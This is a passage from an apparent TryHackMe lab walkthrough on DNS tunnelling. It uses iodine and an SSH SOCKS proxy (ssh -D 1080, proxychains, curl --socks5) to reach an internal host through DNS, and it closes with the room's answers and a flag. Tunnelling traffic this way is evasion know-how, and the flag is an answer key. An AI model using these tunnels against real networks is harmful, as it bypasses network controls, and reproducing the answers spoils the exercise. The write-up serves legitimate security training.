Note that we executed the client-side tool (iodine) and provided the -f and -P arguments explained before. Once the connection is established, we open a new terminal and log in to 10.1.1.1 viaÂ SSH.

Note that all communication over the network 10.1.1.1/24 will be over theÂ DNS. We will be using the -D argument for the dynamic port forwarding feature to use theÂ SSHÂ session as aÂ proxy. Note that we used the -f argument to enforceÂ sshÂ to go to the background. The -4 argument forces theÂ sshÂ client to bind on IPv4 only.Â 

SSHoverDNS  

```markup
root@attacker$ ssh thm@10.1.1.2 -4 -f -N -D 1080
```

Now that we have connected to JumpBox over the dns0 network, open a new terminal and use ProxyChains or Firefox with 127.0.0.1 and port 1080 asÂ proxyÂ settings.Â 

UseSSHConnection as aProxy  

```markup
root@attacker$ proxychains curl http://192.168.0.100/demo.php
root@attacker$ #OR
root@attacker$ curl --socks5 127.0.0.1:1080 http://192.168.0.100/demo.php
```

We can confirm that all traffic goes through theÂ DNSÂ protocol by checking the Tcpdump on theÂ **Attacker**Â machineÂ through theÂ **eth0**Â interface.

![Capturing DNS traffic](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/ffbd2ecb2563c649fde174b40c450097.png)  

Apply theÂ DNSÂ tunneling technique in the provided network environment and accessÂ http://192.168.0.100/test.phpÂ to answer the question below.

Once we did all that, we get the following answers:

```
4

dns0

THM{DN5-Tunn311n9-1s-c00l}
```

![Pasted image 20250516183307.png](../../../IMAGES/Pasted%20image%2020250516183307.png)

